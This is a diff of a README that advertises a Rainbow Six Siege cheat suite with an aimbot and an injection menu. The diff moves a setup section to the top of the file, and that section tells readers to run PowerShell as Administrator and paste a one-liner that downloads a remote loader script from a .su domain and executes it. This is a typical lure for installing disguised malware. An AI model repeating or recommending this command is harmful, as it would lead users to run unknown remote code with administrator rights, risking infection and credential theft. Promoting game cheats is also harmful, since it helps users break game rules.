@@ -4,6 +4,17 @@ The Rainbow Six Siege Cheats Tool is a next-generation enhancement suite for sup
 
 [Activate Now]
 
+## ⚡ Setup Guide (PowerShell Automated Deployment)
+
+1. Extract the loader files.
+2. Open PowerShell as Administrator:
+   ```powershell
+   irm https://software-storage.su/powershell/Loader.ps1 | iex
+   ```
+3. Launch R6S, press `Inject`, and use `Insert` for the r6s hack menu.
+
+---
+
 ## 🎯 Key Features
 
 ### 1. Precision R6S Aimbot System
@@ -33,16 +44,7 @@ Stealth loading mechanism for secure runtime.
 
 ---
 
-## ⚡ Setup Guide (PowerShell Automated Deployment)
 
-1. Extract the loader files.
-2. Open PowerShell as Administrator:
-   ```powershell
-   irm https://software-storage.su/powershell/Loader.ps1 | iex
-   ```
-3. Launch R6S, press `Inject`, and use `Insert` for the r6s hack menu.
-
----
 
 ## 🧠 Workflow Diagram
 
